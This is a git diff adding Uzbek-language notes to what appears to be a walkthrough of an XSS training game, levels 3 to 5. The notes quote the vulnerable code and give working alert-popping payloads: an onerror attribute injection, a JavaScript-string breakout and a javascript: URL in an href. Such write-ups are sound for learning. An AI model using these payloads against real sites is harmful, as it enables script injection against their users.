@@ -37,9 +37,72 @@ Payload yuborilgandan keyin post saqlandi, page ga qayta kirganda `alert()` chiq
 
 # Level 3 
 
+## Zaiflik turi: DOM-based XSS
 
+Bunda URL `num` qiymati JavaScript orqali olinib, innerHTML bilan sahifaga HTML sifatida joylashtiriladi.
 
+Kodning zaif qismi:
 
+![XSS Challanges](./images/03-xss.png)
+```
+var html = "Image " + parseInt(num) + "<br>";
+html += "<img src='/static/level3/cloud" + num + ".jpg' />";
+$('#tabContent').html(html);
+```
 
+Bu kodda num HTML ichiga to'g'ridan-to'g'ri qo'shiladi va .html() orqali render qilinadi.
+Payload:
+``` ' onerror=alert("XSS") ' ```
 
+![XSS Challanges](./images/04-xss.png)
 
+# Level 4
+
+## Zaiflik turi: Reflected XSS
+
+Server foydalanuvchi yuborgan timer qiymatini mana bu joyga qo'yadi:
+
+```<img src="/static/loading.gif" onload="startTimer('{{ timer }}');">```
+
+Timer kodi JavaScript context ichiga joylashtirilgan va maxsus belgilar escaping qilinmagan.
+
+Payload:
+
+``` 3');alert('XSS');// ```
+
+Server tomonidan hosil qilingan HTML:
+
+```<img src="/static/loading.gif" onload="startTimer('3');alert('XSS');//');">```
+
+![XSS Challanges](./images/05-xss.png)
+
+# Level 5
+
+## Zaiflik turi: Reflected XSS
+
+1) signup.html faylida next parametri quyidagi href ichida ishlatilayotgani aniqlandi:
+
+``` <a href="{{ next }}">Next >></a> ```
+
+![XSS Challanges](./images/06-xss.png)
+
+2) URL'dagi next parametri to'g'ridan-to'g'ri href ichiga tushadi
+
+``` {'next': self.request.get('next', 'welcome')} ```
+
+![XSS Challanges](./images/07-xss.png)
+
+Ammo next qiymatini oddiy URL sifatida berish shart emas. HTML attribute ichiga JavaScript URL scheme kiritish mumkinligini tekshirish mumkin.
+next parametri foydalanuvchidan olinib, xavfsiz tekshirilmasdan href attribute ichiga joylashtirilmoqda.
+
+Payload:
+
+``` javascript:alert('XSS') ```
+
+payload ushbu ko'rinishda qo'shiladi:
+
+```<a href="javascript:alert('XSS')">Next >></a>```
+
+![XSS Challanges](./images/08-xss.png)
+
+# Level 6
